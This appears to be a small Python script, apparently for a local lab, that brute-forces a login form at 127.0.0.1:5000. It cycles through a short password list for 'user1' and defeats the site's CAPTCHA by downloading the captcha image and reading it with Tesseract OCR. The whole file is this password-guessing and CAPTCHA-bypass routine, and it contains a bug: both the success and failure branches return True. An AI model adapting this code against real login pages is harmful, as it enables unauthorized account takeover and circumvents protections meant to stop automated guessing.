

import requests
from tqdm import tqdm
from time import sleep


from PIL import Image
import pytesseract
from io import BytesIO
import requests

def solve_captcha():
    r = requests.get("http://127.0.0.1:5000/captcha.png")
    img = Image.open(BytesIO(r.content))
    text = pytesseract.image_to_string(img)
    return text




url = "http://127.0.0.1:5000/home/"

def test_login(username, password):
    data = {"username": username, 
            "password":password
            }
    response = requests.post(url, data=data)
    if "Captcha" in response.text:
        print("Captcha create waiting {2seconds}")
        sleep(2)
        captcha_text = solve_captcha()
        if captcha_text:
            data = {"username": username, 
            "password":password,"captcha":captcha_text
            }
            response = requests.post(url, data=data)


    if "success" in response.text:
        print(f"{password} is correct")
        return True
    else:
        print(f"password is incorrect")
        return True
    
passwords = ["www", "123", "blalala", "1234567", "pass1"]
for password in tqdm(passwords):
    test_login("user1", password)